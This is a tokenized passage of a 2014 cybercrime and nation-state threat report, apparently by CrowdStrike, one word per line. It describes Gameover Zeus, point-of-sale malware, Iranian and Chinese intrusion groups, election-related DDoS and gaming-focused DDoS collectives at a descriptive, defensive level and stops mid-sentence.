cybercrime
landscape
of
2015
?
CrowdStrike
predicts
the
continuation
of
development
in
banking
Trojans
such
as
Dyreza
and
Dridex
.

As
recently
as
November
,
Dridex
has
added
Peer
-
to
-
Peer
(
P2P
)
functionality
to
its
arsenal
in
an
attempt
to
become
more
resilient
,
and
it
is
likely
changes
in
its
capability
will
continue
.

In
addition
,
it
is
likely
new
threats
will
follow
the
business
model
of
using
of
phishing
lures
delivered
by
spambots
using
a
range
of
first
-
stage
loaders
to
keep
their
primary
payloads
under
the
radar
.

Ransomware
will
continue
to
become
more
of
a
threat
as
continued
copycats
try
to
develop
the
next
market
leader
.

Gameover
Zeus
Takedown
Gameover
Zeus
(
GOZ
)
was
a
complex
P2P
botnet
that
has
been
one
of
the
most
prevalent
cyber
threats
for
almost
four
years
.

It
was
forked
off
the
infamous
Zeus
Trojan
,
the
source
code
of
which
was
leaked
in
spring
2011
–
just
a
few
months
before
the
appearance
of
the
first
GOZ
version
.

GOZ
was
largely
used
for
banking
fraud
and
the
delivery
of
other
malware
,
such
as
the
CryptoLocker
ransomware
Trojan
,
and
is
believed
to
have
caused
more
than
$
100
million
in
financial
damage
.

The
GOZ
botnet
was
long
believed
to
be
resistant
to
any
takedown
attempts
because
of
its
complex
,
tiered
infrastructure
:
Infected
machines
form
a
decentralized
P2P
network
,
with
some
peers
acting
as
proxy
nodes
(
brokers
between
bots
and
the
next
tier
)
.

This
upper
tier
,
again
,
consists
of
proxies
that
conceal
the
location
of
the
actual
back
end
.

The
use
of
P2P
technology
eliminates
static
rendezvous
points
and
allows
the
botnet
operators
to
announce
new
centralized
components
at
any
time
,
which
makes
any
Notable
Activity
efforts
against
them
pointless
.

On
top
of
this
,
a
fallback
mechanism
generates
a
weekly
-
changing
,
deterministic
set
of
1,000
domain
names
that
the
botmaster
can
register
in
order
to
serve
fresh
peer
lists
.

Bots
that
fail
to
establish
contact
with
the
P2P
network
would
consult
the
Domain
Generation
Algorithm
(
DGA
)
in
order
to
retrieve
a
new
set
of
peers
.

Finally
,
all
communication
in
the
botnet
is
encrypted
.

In
June
2014
,
the
botnet
was
disrupted
in
a
coordinated
effort
called
Operation
Tovar
that
was
the
culmination
of
months
of
technical
investigation
and
legal
wrangling
.

The
botnet
was
disrupted
by
the
taking
over
of
its
infrastructure
and
at
the
same
time
preventing
access
by
the
botmasters
.

While
this
effort
had
to
take
into
account
and
block
all
different
communication
channels
,
it
was
primarily
focused
on
the
P2P
network
,
as
it
was
the
most
complex
component
.

By
propagating
specially
crafted
messages
in
the
botnet
,
its
infrastructure
was
degenerated
and
bots
were
redirected
to
sinkholes
.

The
CrowdStrike
Intelligence
team
provided
technical
expertise
to
permit
the
enforcement
of
a
Temporary
Restraining
Order
(
TRO
)
,
which
successfully
disrupted
not
only
the
infamous
Gameover
Zeus
botnet
,
but
also
CryptoLocker
.

In
addition
to
the
technical
disruption
,
the
U.S.

Department
of
Justice
filed
an
indictment
against
an
individual
called
Evgeniy
Mikhailovich
Bogachev
,
who
is
believed
to
be
behind
the
GOZ
botnet
,
as
well
as
several
other
unnamed
co
-
conspirators
.

Point
-
of
-
Sale
Malware
and
Related
Intrusions
Credit
card
fraud
has
traditionally
been
popular
in
the
cybercrime
scene
.

In
cases
where
credit
card
data
is
stolen
through
website
breaches
,
the
exposed
data
usually
consists
of
the
card
numbers
,
expiration
dates
,
cardholder
names
,
and
card
security
codes
.

However
,
with
this
data
alone
,
it
is
not
always
possible
to
accurately
recreate
what
can
be
found
on
a
card
's
magnetic
strip
.

In
the
criminal
marketplace
,
card
track
data
is
therefore
generally
more
highly
valued
than
the
information
mentioned
above
because
it
can
be
used
in
multiple
ways
,
including
manufacturing
counterfeit
credit
cards
.

Throughout
2014
,
CrowdStrike
Intelligence
investigated
several
large
Notable
Activity
breaches
of
U.S.

companies
in
the
retail
sector
.

These
breaches
involved
targeting
of
Point
-
of
-
Sale
(
PoS
)
terminals
in
order
to
plunder
consumer
credit
card
information
.

By
infecting
terminals
with
malware
specifically
designed
to
steal
credit
card
information
as
the
cards
are
swiped
by
customers
,
attackers
were
able
to
collect
data
for
hundreds
of
thousands
of
credit
cards
.

Running
in
the
background
of
a
terminal
,
the
malware
would
continuously
scan
memory
for
unique
patterns
found
on
a
card
's
magnetic
strip
and
exfiltrate
matching
data
to
an
adversary
-
controlled
server
.

Notable
Activity
Target
Breach
On
19
December
2013
,
U.S
.-
based
retailer
Target
released
a
statement
confirming
a
breach
and
providing
an
estimate
of
the
total
scope
.

According
to
the
statement
,
the
actors
were
able
to
steal
data
for
approximately
40
million
credit
cards
and
up
to
70
million
individuals
'
records
with
Personally
Identifiable
Information
(
PII
)
.

From
reporting
about
the
breach
,
it
is
publicly
speculated
that
the
actors
were
able
to
access
Target
's
network
via
credentials
stolen
from
a
Pennsylvania
-
based
HVAC
contractor
that
provided
services
to
Target
.

In
January
2014
,
CrowdStrike
Intelligence
analyzed
several
files
from
the
incident
.

One
of
these
files
was
a
PoS
malware
named
Kaptoxa
(
also
known
as
mmon
)
,
which
is
used
as
a
component
in
another
PoS
malware
,
BlackPoS.

This
copy
of
Kaptoxa
continuously
scanned
volatile
memory
of
infected
systems
for
patterns
that
looked
like
credit
card
numbers
and
logged
them
to
a
file
that
was
transferred
to
an
internal
network
share
at
regular
intervals
.

Another
utility
was
deployed
onto
these
network
shares
to
perform
the
final
exfiltration
step
in
which
the
data
was
transferred
to
external
FTP
servers
.

In
January
2014
,
CrowdStrike
identified
a
malware
staging
site
that
was
hosting
a
copy
of
the
BlackPoS
source
code
.

While
it
is
believed
that
this
site
is
not
linked
to
the
Target
breach
,
analysis
of
the
source
code
provided
additional
insight
into
the
simplicity
of
these
tools
.

Compared
to
other
crimeware
families
,
most
PoS
malware
is
relatively
simple
in
design
and
functionality
.

The
malware
used
does
not
accept
tasking
from
controllers
or
external
systems
;
its
sole
function
is
to
scan
,
log
,
and
exfiltrate
data
found
.

Despite
the
simplistic
nature
of
these
tools
,
the
adversary
behind
the
Target
breach
demonstrated
sophisticated
tradecraft
in
mounting
a
successful
operation
,
primarily
by
taking
full
advantage
of
the
initial
stolen
credentials
to
laterally
move
throughout
the
targeted
network
into
the
PoS
systems
.

The
Rise
of
Commodity
PoS
In
2014
,
while
several
major
companies
were
coping
with
breaches
of
their
PoS
infrastructure
,
many
smaller
retailers
were
facing
the
same
threat
from
less
-
organized
groups
.

In
underground
marketplaces
,
ready
-
to
-
use
PoS
malware
kits
were
becoming
more
commonly
available
.

Notable
Activity
Malware
such
as
BlackPoS
requires
a
bit
of
strategic
planning
on
the
part
of
the
adversary
;
much
of
the
system
lacks
the
point
-
and
-
click
intuitive
nature
of
commodity
botnets
.

For
less
-
organized
or
less
-
skilled
adversary
groups
,
an
off
-
the
-
shelf
kit
such
as
Dexter
PoS
may
allow
for
exploitation
and
offensive
capabilities
that
may
not
otherwise
be
possible
.

Dexter
,
which
CrowdStrike
Intelligence
reported
on
in
2013
,
became
one
of
the
most
publicly
known
PoS
malware
kits
on
the
market
.

By
late
2014
,
the
source
code
for
Dexter
was
publicly
available
on
several
criminal
forums
.

The
malware
scans
memory
for
both
Track
1
and
Track
2
credit
card
data
and
exfiltrates
its
findings
back
to
control
servers
over
HTTP
requests
.

Dexter
Command-
and
-
Control
Panel
Dexter
offers
an
adversary
a
clean
,
simple
control
panel
,
which
allows
for
infected
host
management
and
viewing
of
obtained
data
.

In
2014
,
CrowdStrike
investigated
several
other
kits
similar
to
Dexter
,
including
vSkimmer
and
JackPoS
,
which
also
focused
on
stealing
credit
card
numbers
from
infected
terminals
.

Many
of
these
lacked
technical
sophistication
,
but
were
generally
found
to
be
effective
in
identifying
and
exfiltrating
any
found
data
.

Notable
Activity
State
Targeted
Intrusion
Trends
in
2014
Incidents
of
targeted
intrusion
activity
related
to
nation
-
state
interests
have
been
on
the
increase
for
the
past
several
years
.

Different
states
'
activities
often
reflect
their
national
interests
and
agendas
,
or
their
deepest
concerns
.

As
an
example
,
Chinese
nation
-
state
actors
appeared
to
clearly
align
and
plan
operations
in
support
of
real
-
world
activities
in
the
case
of
the
Haiyang
Shiyou
981
oil
platform
.

In
direct
contradiction
to
pre
-
planned
operations
,
in
the
case
of
the
Umbrella
Revolution
that
dominated
the
streets
of
Hong
Kong
during
the
summer
and
fall
of
2014
,
Chinese
adversary
groups
were
observed
broadly
targeting
any
and
all
organizations
related
to
the
civil
unrest
in
a
wild
attempt
to
collect
intelligence
on
the
protestors
and
their
movements
.

During
the
course
of
2014
,
CrowdStrike
observed
the
continued
proliferation
of
targeted
intrusion
activity
.

Nation
-
states
understand
the
value
of
collecting
intelligence
in
the
information
domain
and
are
mobilizing
resources
to
capitalize
on
the
intelligence
opportunities
that
exist
there
.

While
the
CrowdStrike
Intelligence
team
identified
and
analyzed
well
over
a
dozen
new
adversary
groups
worldwide
in
2014
,
there
were
several
that
were
of
general
interest
.

FLYING
KITTEN
FLYING
KITTEN
is
an
adversary
believed
to
be
operating
out
of
the
Islamic
Republic
of
Iran
.

This
group
was
first
observed
initiating
targeted
intrusion
activity
in
late
2013
and
has
continued
to
be
active
throughout
2014
.

In
January
2014
,
CrowdStrike
became
aware
of
an
ongoing
operation
by
this
actor
targeting
a
company
in
the
defense
industrial
base
in
the
United
States
.

This
campaign
leveraged
fake
websites
to
trick
users
into
entering
credentials
,
and
to
concurrently
serve
malware
that
poses
as
software
updates
for
legitimate
applications
.

Shortly
after
this
activity
was
identified
,
other
campaigns
against
additional
targets
in
the
defense
and
aerospace
sectors
were
observed
.

Evidence
supporting
the
attribution
of
FLYING
KITTEN
to
Iran
is
found
in
their
secondary
focus
,
which
targets
Iranian
dissidents
in
foreign
countries
,
as
well
as
in
Iran
itself
.

Notable
Activity
A
common
tactic
of
FLYING
KITTEN
is
to
set
up
spoofed
login
web
pages
on
domains
that
closely
resemble
the
legitimate
pages
used
by
the
targets
.

These
fake
web
pages
serve
two
purposes
:
They
log
credentials
entered
by
users
who
believe
the
page
is
a
legitimate
authentication
mechanism
,
and
then
redirect
to
another
page
that
prompts
the
download
of
an
alleged
patch
or
update
that
is
,
in
fact
,
a
copy
of
their
remote
access
tool
.

This
tool
is
used
to
log
keystrokes
,
screenshots
,
and
other
user
activity
on
infected
systems
and
exfiltrates
this
data
to
an
attacker
-
controlled
server
.

The
primary
remote
access
tool
used
by
FLYING
KITTEN
is
a
dropper
that
is
written
in
C
#
.NET
and
generally
uses
the
same
filename
.

The
files
to
be
dropped
are
stored
in
.NET
resources
embedded
in
the
executable
.

When
executed
,
it
extracts
and
deploys
a
backdoor
Trojan
,
a
configuration
file
,
and
optionally
a
decoy
(
an
image
or
a
legitimate
executable
)
.

Likewise
,
the
backdoor
executable
is
also
written
in
C
#
,
meaning
it
can
be
decompiled
back
to
a
representation
of
the
original
source
code
.

This
code
lists
several
classes
with
telling
names
,
such
as
Stealer
.
Browser
,
Stealer
.
Keylogger
,
or
Stealer
.
Messenger
.

Further
,
the
code
contains
transcripts
of
Farsi
language
artifacts
,
e.g.
,
HavijeBaba
and
salam!*%
#
,
as
shown
below
.

In
addition
to
the
aerospace
/
defense
and
dissident
targeting
,
it
appears
that
FLYING
KITTEN
was
also
engaged
in
broader
targeting
via
the
website
parmanpower.com
that
purported
to
be
the
website
of
a
business
engaged
in
recruiting
,
training
,
and
development
in
Erbil
,
Iraq
.

The
Whois
record
Notable
Activity
for
this
website
is
the
same
as
for
some
of
the
other
domains
related
to
the
activity
discussed
above
,
which
indicates
that
it
was
also
in
use
by
this
adversary
,
but
the
actual
purpose
of
the
website
is
still
unknown
.

The
registrant
email
that
currently
appears
in
Whois
records
for
many
of
the
observed
domains
is
info@usa.gov.us
.

However
,
historical
records
show
that
the
domains
were
originally
registered
under
the
email
address
keyvan
.

ajaxtm@gmail.com
,
which
ties
back
to
an
Iran
-
based
entity
called
Ajax
Security
Team
.

This
group
has
been
known
for
low
-
level
web
defacements
and
SQL
injection
attacks
for
some
time
.

Until
early
2014
,
Ajax
Security
had
an
easily
identifiable
presence
on
the
Internet
with
its
own
website
and
related
Facebook
pages
.

This
Internet
presence
has
decreased
significantly
,
likely
due
to
a
desire
to
keep
a
lower
profile
now
that
the
group
is
engaged
in
targeted
intrusion
activity
.

CHARMING
KITTEN
In
late
May
,
public
reporting
was
released
about
an
Iran
-
based
adversary
that
leverages
fake
personas
on
social
networking
sites
in
order
to
conduct
social
engineering
and
ultimately
targeted
attacks
against
desired
targets
.

This
adversary
,
CHARMING
KITTEN
,
has
been
known
to
CrowdStrike
Intelligence
since
January
2014
,
when
it
was
observed
targeting
individuals
in
the
U.S.

government
and
defense
sectors
.

CHARMING
KITTEN
engaged
in
both
credential
collection
and
malware
operations
.

Credential
collection
occurred
through
spoofed
websites
meant
to
appear
as
if
they
were
legitimate
sites
such
as
YouTube
.

When
victims
clicked
on
the
log
in
link
,
they
were
redirected
to
a
different
website
that
prompted
them
to
enter
credentials
for
harvesting
by
the
adversary
.

The
malware
used
by
this
adversary
is
an
Internet
Relay
Chat
(
IRC)-based
malware
variant
referred
to
as
Parastoo
because
of
the
IRC
password
it
uses
.

This
malware
possesses
Notable
Activity
an
extensive
command
set
capable
of
conducting
reconnaissance
of
victim
machines
,
deleting
files
,
downloading
files
,
and
exfiltrating
data
.

A
number
of
factors
support
CHARMING
KITTEN
's
nexus
to
Iran
.

First
of
all
,
the
"
Parastoo
"
password
used
by
the
malware
is
an
Iranian
word
used
to
refer
to
small
birds
.

Also
,
the
adversary
used
Iran
-
based
web
hosting
providers
and
infrastructure
to
host
malicious
domains
.

Finally
,
one
of
the
droppers
related
to
one
of
the
identified
Parastoo
variants
dropped
a
Persian
-
language
decoy
document
purporting
to
be
from
Iran
's
Ministry
of
Interior
.

PlugX
–
The
Panda
's
Tool
of
Choice
CrowdStrike
has
observed
an
upward
trend
in
the
use
of
PlugX
Remote
Access
Tool
(
RAT
)
malware
during
2014
.

Multiple
adversary
groups
have
used
PlugX
to
target
a
number
of
sectors
in
countries
surrounding
China
's
sphere
of
influence
,
particularly
those
involved
in
science
&
technology
,
government
,
and
defense
.

Further
afield
,
PlugX
has
been
used
in
persistent
campaigns
against
commercial
entities
in
the
United
States
,
as
well
as
to
target
organizations
involved
in
counter
-
terrorism
or
other
political
efforts
worldwide
.

Attacks
associated
with
GOBLIN
PANDA
have
been
observed
at
an
increasing
rate
throughout
the
latter
half
of
the
year
,
while
in
the
closing
months
of
2014
CrowdStrike
has
investigated
several
instances
of
PlugX
activity
consistent
with
the
HURRICANE
PANDA
and
PALE
PANDA
adversaries
.

Other
China
-
based
adversaries
observed
using
PlugX
in
their
operations
include
AURORA
PANDA
,
NIGHTSHADE
PANDA
,
PREDATOR
PANDA
,
EMISSARY
PANDA
,
and
WET
PANDA
.

The
upward
trend
in
use
of
PlugX
indicates
an
increasing
confidence
in
the
capabilities
of
the
platform
,
justifying
its
continued
use
across
multiple
sectors
and
countries
.

PlugX
has
existed
in
some
form
since
2008
and
has
evolved
over
time
to
offer
new
capabilities
and
control
mechanisms
,
supported
by
an
active
development
program
.

It
provides
an
attacker
with
a
range
of
functionality
including
the
ability
to
log
keystrokes
;
modify
and
copy
files
;
capture
screenshots
or
video
of
user
activity
;
and
perform
administrative
tasks
such
Notable
Activity
as
terminating
processes
,
logging
off
users
,
and
rebooting
victim
machines
.

A
full
command
shell
is
also
provided
through
access
to
a
cmd.exe
process
,
which
sends
output
to
the
PlugX
instance
over
named
pipes
for
onward
relay
to
the
attacker
's
Command
-
and
-
Control
(
C2
)
servers
.

While
these
capabilities
are
not
unusual
for
a
RAT
and
are
comparable
to
those
provided
by
Poison
Ivy
and
other
tools
,
PlugX
also
offers
a
range
of
C2
protocols
and
execution
options
that
help
reduce
the
risk
of
being
detected
by
network
defenders
.

Over
time
,
these
capabilities
have
been
augmented
with
additional
releases
of
versions
and
plugins
,
which
have
in
turn
been
deployed
by
adversaries
in
active
and
ongoing
campaigns
.

For
example
,
GOBLIN
PANDA
has
been
observed
using
PlugX
with
internal
version
numbers
of
20140101
in
campaigns
since
Q2
2014
,
migrating
to
deployments
of
20140606
versions
in
the
second
half
of
the
year
.

PlugX
is
most
frequently
delivered
to
targets
via
a
spear
phishing
attack
containing
a
malicious
RTF
or
Word
document
leveraging
exploit
code
for
the
popular
CVE-2012
-
0158
vulnerability
.

Some
adversary
groups
also
attempted
to
leverage
the
CVE-2014
-
1761
vulnerability
as
a
way
to
maximize
the
chance
of
exploitation
against
more
recently
patched
systems
,
with
varying
degrees
of
success
.

Attacks
have
also
been
identified
using
PowerPoint
and
Excel
file
formats
,
as
well
as
self
-
extracting
RAR
files
and
plain
executables
as
email
attachments
.

However
PlugX
is
installed
on
a
victim
machine
,
typically
three
files
are
dropped
on
the
file
system
after
exploitation
to
enable
initial
start
-
up
of
the
malware
:
a
legitimate
,
digitally
signed
application
;
an
encrypted
file
containing
the
PlugX
payload
;
and
a
malicious
,
dynamically
-
linked
library
that
is
used
to
load
the
malware
using
the
Dynamic
Link
Library
(
DLL
)
side
-
loading
technique
when
the
legitimate
application
is
executed
.

This
methodology
can
provide
a
level
of
protection
against
some
threat
detection
techniques
employed
by
anti
-
virus
software
packages
,
as
the
parent
process
is
a
non
-
malicious
executable
.

Often
,
a
computer
security
tool
such
as
a
component
of
a
commercial
anti
-
virus
application
is
used
for
this
purpose
,
likely
to
take
advantage
of
any
process
whitelisting
strategies
that
may
be
in
place
on
a
network
.

Notable
Activity
Command
and
control
of
PlugX
malware
is
facilitated
using
a
range
of
protocols
including
HTTP
and
a
binary
channel
over
ICMP
.

During
2014
,
CrowdStrike
observed
an
increased
use
of
a
newer
DNS
C2
module
that
transmits
data
as
lengthy
DNS
queries
to
adversary
-
controlled
infrastructure
.

While
this
mechanism
deviates
from
some
of
the
more
typically
monitored
protocols
,
the
verbosity
of
communication
using
this
module
may
provide
opportunities
for
detection
through
proactive
analysis
of
such
traffic
leaving
a
network
.

Further
demonstrating
the
continued
development
of
this
platform
,
CrowdStrike
observed
modifications
to
HTTP
and
DNS
requests
produced
by
PlugX
throughout
the
year
,
presenting
an
adapting
challenge
for
detection
of
this
threat
.

However
,
while
some
adversary
groups
have
registered
domains
over
the
course
of
2014
for
use
in
PlugX
C2
(
e.g.
,
proxyme.net
)
,
there
has
been
a
continued
use
of
domain
names
that
have
been
active
for
a
number
of
years
,
indicating
the
effectiveness
of
this
infrastructure
over
extended
periods
of
time
.

The
ongoing
development
of
PlugX
provides
attackers
with
a
flexible
capability
that
requires
continued
vigilance
on
the
part
of
network
defenders
in
order
to
detect
it
reliably
.

There
is
currently
no
clear
evidence
to
suggest
that
use
of
PlugX
has
proliferated
to
adversaries
attributed
outside
of
China
;
an
increase
in
its
deployment
over
the
last
year
could
be
a
precursor
to
future
worldwide
use
,
particularly
as
PlugX
succeeds
legacy
capabilities
such
as
Poison
Ivy
as
an
adversary
tool
of
choice
.

Notable
Activity
Hacktivist
/
Nationalist
Hacktivist-
and
nationalist
-
motivated
cyber
actors
are
a
third
class
of
adversary
tracked
by
the
CrowdStrike
Intelligence
team
.

The
goals
of
these
actors
may
range
from
causing
mischief
for
laughs
to
influencing
opinions
or
views
about
a
particular
issue
.

During
the
course
of
2014
,
there
were
a
few
notable
events
that
demonstrate
the
capabilities
of
these
actors
.

As
electronic
voting
continues
to
be
used
by
more
and
more
countries
,
the
targeting
of
such
processes
and
equipment
will
continue
to
expand
.

Operations
Targeting
Elections
In
July
2014
,
the
electronic
voter
registration
system
for
the
then-
upcoming
Tunisian
presidential
election
suffered
a
cyber
attack
,
rendering
registrations
impossible
for
an
unknown
amount
of
time
.

Sources
reported
that
the
authorities
had
control
over
the
attack
and
that
it
was
a
systematic
process
,
intended
to
strike
the
electoral
process
.

This
incident
is
yet
another
example
of
cyber
attacks
targeting
electronic
voting
systems
to
manipulate
an
outcome
.

CyberBerkut
In
February
2014
,
several
bloody
protests
took
place
in
Ukraine
resulting
in
the
ousting
of
the
pro
-
Russia
prime
minister
,
and
an
interim
government
was
created
with
the
goal
of
creating
closer
ties
with
the
European
Union
(
EU
)
.

Following
the
protests
,
CyberBerkut
,
a
self
-
proclaimed
nationalistic
hacking
group
,
began
taking
credit
for
hacks
against
Ukrainian
interim
leaders
.

The
group
was
extremely
proactive
about
distributing
propaganda
decrying
the
new
government
and
recruiting
pro
-
Russia
supporters
to
engage
in
participatory
Distributed
Denial
of
Service
(
DDoS
)
attacks
against
a
multitude
of
Ukrainian
government
and
media
sites
.

These
attacks
were
likely
directed
by
Russian
state
services
,
with
the
CyberBerkut
hacktivists
providing
a
layer
of
plausible
deniability
.

Several
of
the
DDoS
attacks
against
Ukraine
's
Central
Election
Commission
(
CEC
)
coincided
with
Russian
state
media
broadcasts
,
further
suggesting
coordination
at
the
state
level
.

In
one
case
,
an
attack
on
the
CEC
occurred
around
the
time
the
election
results
were
supposed
to
appear
,
while
a
simultaneous
broadcast
on
Russian
state
media
appeared
to
show
false
Notable
Activity
results
where
an
extremist
candidate
won
the
election
by
a
hefty
margin
.

The
goal
of
the
operation
was
likely
to
cause
temporary
confusion
over
the
immediate
results
of
the
election
and
to
cause
observers
to
question
the
legitimacy
of
the
elections
,
which
were
touted
as
being
fair
and
well
equipped
to
withstand
attacks
.

Had
the
operation
been
successful
,
it
likely
would
have
incited
unrest
in
Ukraine
and
supported
the
Russian
narrative
that
the
elections
were
illegitimate
and
that
Russian
intervention
was
needed
to
prevent
Ukraine
from
slipping
into
complete
chaos
.

Whereas
previous
conflicts
between
Russia
and
former
Soviet
states
Estonia
and
Georgia
saw
a
much
heavier
use
of
cyber
tactics
used
to
bring
down
critical
infrastructure
and
disrupt
communications
,
the
efforts
against
Ukraine
appeared
muted
and
designed
more
for
a
disinformation
campaign
to
stir
unrest
in
order
for
Russia
to
intervene
in
Ukraine
in
a
"
peacekeeper
"
role
as
it
did
in
Crimea
.

The
widespread
publicity
the
conflict
received
in
global
media
along
with
the
threat
of
heavy
sanctions
imposed
by
the
west
may
have
been
a
factor
in
preventing
more
aggressive
cyber
action
from
Russia
.

Although
the
campaign
appeared
to
be
ultimately
unsuccessful
,
partly
due
to
a
prepared
Ukrainian
defense
,
CrowdStrike
noted
several
interesting
observations
.

Though
the
use
of
a
proxy
to
carry
out
attacks
for
the
purposes
of
plausible
deniability
is
hardly
new
,
the
coordination
of
the
propaganda
distributed
and
Russian
media
reporting
was
particularly
telling
with
regard
to
how
Russian
state
services
can
direct
many
moving
parts
in
unison
to
achieve
their
goals
via
cyber
means
.

In
addition
,
the
participatory
DDoS
client
software
CyberBerkut
advertised
to
help
launch
DDoS
attacks
against
the
Ukrainian
government
actually
installed
a
backdoor
on
victims
'
machines
,
presumably
enabling
Russian
intelligence
services
to
make
a
new
botnet
out
of
the
compromised
"
volunteers
"
,
which
could
be
used
in
future
conflicts
.

CrowdStrike
Intelligence
also
investigated
targeted
attacks
by
CyberBerkut
against
Ukrainian
organizations
and
entities
operating
or
doing
business
in
Ukraine
.

CyberBerkut
was
first
observed
in
March
2014
when
it
made
statements
about
the
illegitimacy
of
the
government
that
took
over
Ukraine
Notable
Activity
upon
the
ousting
of
former
president
,
Viktor
Yanukovych
.

Around
this
same
time
,
the
group
launched
DDoS
attacks
against
state
-
controlled
media
in
the
country
as
well
as
against
NATO
entities
such
as
the
Cooperative
Cyber
Defense
Center
of
Excellence
(
CCDCOE
)
.

In
April
,
CyberBerkut
claimed
responsibility
for
defacing
the
websites
of
several
private
military
companies
–
Greystone
,
Triple
Canopy
,
and
Academi
–
that
they
claimed
were
operating
on
the
ground
in
Ukraine
.

CyberBerkut
's
operations
during
2014
were
very
much
in
line
with
the
priorities
of
the
Russian
state
;
however
,
it
is
unclear
if
its
activity
is
directly
state
sponsored
or
if
it
is
an
independent
group
carrying
out
attacks
motivated
by
Russian
nationalistic
ideals
.

Umbrella
Revolution
First
observed
in
late
2013
,
the
People
's
Republic
of
China
(
PRC
)
steadily
increased
the
use
of
its
intelligence
services
and
cyber
operations
in
Hong
Kong
as
part
of
a
response
to
the
protests
supporting
universal
suffrage
and
democracy
headed
by
Occupy
Central
(
和平占中
)
.

The
Hong
Kong
protests
fueled
fears
in
the
Chinese
Communist
Party
(
CCP
)
,
which
perceives
them
as
a
threat
to
its
one
-
party
rule
in
mainland
China
.

This
perceived
threat
likely
prompted
the
flurry
of
malicious
cyber
activity
taken
against
various
organizations
and
citizens
operating
in
support
of
the
protests
within
Hong
Kong
,
later
dubbed
the
Umbrella
Revolution
.

The
methods
used
were
a
smattering
of
cyber
tactics
and
human
intelligence
(
HUMINT
)
methods
to
collect
information
about
leaders
of
the
Occupy
Central
Movement
and
locations
of
its
supporters
,
as
well
as
to
gain
an
overall
picture
of
Hong
Kong
citizens
'
perception
of
the
protests
.

This
began
with
strategic
web
compromises
of
key
websites
associated
with
Occupy
Central
in
late
2013
,
followed
by
extensive
HUMINT
activities
carried
out
in
early
2014
by
suspected
Ministry
of
State
Security
(
MSS
)
officers
likely
Notable
Activity
designed
to
elicit
information
from
influential
figures
in
Hong
Kong
and
pressure
them
to
support
Beijing
's
stance
in
exchange
for
gifts
.

The
protests
reached
a
critical
point
when
a
democratic
online
referendum
was
held
in
June
2014
calling
for
open
elections
of
Hong
Kong
's
chief
executive
.

At
the
peak
of
voting
,
the
online
hosting
system
,
Popvote
(
which
at
one
point
exceeded
500
gbps
of
traffic
)
,
suffered
a
massive
DDoS
attack
.

The
attackers
were
persistent
and
scaled
their
attacks
as
defenders
responded
to
the
attack
,
starting
with
Layer
3
and
4
attacks
and
progressively
using
more
advanced
Layer
7
attacks
.

Though
the
voting
system
did
persist
and
drew
more
than
780,000
votes
,
the
apparent
effort
the
PRC
went
through
to
down
the
referendum
was
substantial
.

As
the
protests
persisted
,
the
PRC
appeared
to
increase
its
attempts
to
monitor
the
protestors
by
proliferating
mobile
malware
for
both
the
Android
and
iOS
operating
systems
.

The
mobile
Remote
Access
Tools
(
mRATs
)
were
authored
by
two
individuals
with
extensive
ties
to
legacy
Chinese
hackers
and
were
likely
contracted
out
to
customize
malware
for
the
purpose
of
monitoring
protestors
'
communications
and
physical
locations
.

In
addition
to
these
specialized
attacks
and
extensive
censorship
of
the
Umbrella
Revolution
in
mainland
China
,
the
PRC
appears
to
have
taken
a
shotgun
approach
to
handling
the
protests
as
they
persisted
.

Several
known
China
-
based
groups
including
MAVERICK
PANDA
,
VIXEN
PANDA
,
TEMPER
PANDA
,
SABRE
PANDA
,
and
HURRICANE
PANDA
were
observed
participating
in
activity
related
to
the
protests
,
suggesting
a
possible
cross-
divisional
tasking
as
the
CCP
saw
support
for
the
protests
increase
.

This
demonstrates
the
variety
of
approaches
China
has
when
dealing
with
a
threat
to
the
CCP
's
one
-
party
rule
.

Along
with
the
mobile
targeting
of
most
of
the
citizens
of
Hong
Kong
,
it
shows
a
new
level
of
brazenness
that
is
becoming
increasingly
common
in
Chinese
cyber
operations
.

LizardSquad
/
DerpTrolling
DerpTrolling
The
hacking
collective
DerpTrolling
made
early
2014
media
headlines
Notable
Activity
after
claiming
a
string
of
DDoS
attacks
on
multiple
gaming
companies
and
online
gaming
servers
.

The
group
likely
originated
out
of
the
Steam
gaming
community
,
where
some
of
its
suspected
members
engaged
in
early
DDoS
attacks
on
rival
gaming
clans
and
their
servers
.

DerpTrolling
's
antics
were
often
childish
and
had
no
clear
motive
other
than
being
"
for
the
lulz
"
and
to
boost
their
own
egos
.

For
this
reason
,
they
can
not
be
classified
as
hacktivists
.

Despite
their
immaturity
,
the
collective
was
able
to
consistently
carry
out
DDoS
attacks
on
targets
of
their
choosing
,
and
these
attacks
had
a
real
-
world
effect
on
the
victims
within
the
gaming
community
.

The
attacks
were
particularly
noteworthy
as
their
DDoS
tool
,
dubbed
the
Gaben
Laser
Beam
(
GLB
)
after
Gabe
Newell
,
the
creator
of
Half
-
Life
and
the
Steam
community
,
supposedly
created
an
attack
that
exceeded
400
gbps
of
network
traffic
utilizing
a
NTP
reflection
attack
.

This
suggested
DerpTrolling
possessed
an
above
-
average
knowledge
of
network
protocols
.

While
NTP
reflection
is
commonly
known
in
the
security
community
,
most
"
script
kiddies
"
or
"
skids
"
were
not
aware
of
some
of
these
more
advanced
techniques
involving
amplification
,
which
allows
for
fewer
devices
needed
to
pull
off
larger
DDoS
attacks
.

DerpTrolling
has
reportedly
had
several
run
-
ins
with
law
enforcement
,
though
it
is
unclear
how
much
of
this
is
verifiable
versus
a
ploy
to
increase
their
notoriety
.

One
supposed
encounter
resulted
in
the
group
going
silent
for
several
months
before
returning
and
carrying
out
lower
-
level
attacks
on
the
gaming
community
once
again
.

Given
the
collective
's
poor
operational
security
practices
,
it
is
likely
that
the
members
are
actively
being
tracked
by
law
enforcement
agencies
and
that
they
can
not
continue
to
maintain
high-
profile
attacks
while
evading
capture
.

LizardSquad
Another
group
to
begin
DDoS
operations
targeting
the
gaming
community
in
2014
is
LizardSquad
.

The
group
was
characterized
by
DerpTrolling
as
much
less
skilled
,
however
there
may
be
some
overlap
of
members
between
the
groups
.

At
this
time
,
LizardSquad
has
not
shown
any
of
the
more
advanced
amplification
techniques
used
previously
by
DerpTrolling
.

LizardSquad
quickly
rose
to
prominence
after
several
media
stunts
drew
Notable
Activity
significant
attention
from
the
press
as
well
as
law
enforcement
.

LizardSquad
not
only
began
claiming
to
be
affiliates
of
the
Islamic
State
of
Iraq
and
Syria
(
ISIS
)
,
but
also
called
in
a
bomb
threat
,
grounding
a
flight
on
which
a
Sony
Online
Entertainment
executive
was
a
passenger
.

Though
the
group
appears
to
have
no
terrorist
ties
,
their
antics
quickly
gained
them
notoriety
.

LizardSquad
has
even
poorer
operational
security
practices
than
DerpTrolling
,
which
allowed
CrowdStrike
to
easily
provide
attribution
on
possible
members
of
the
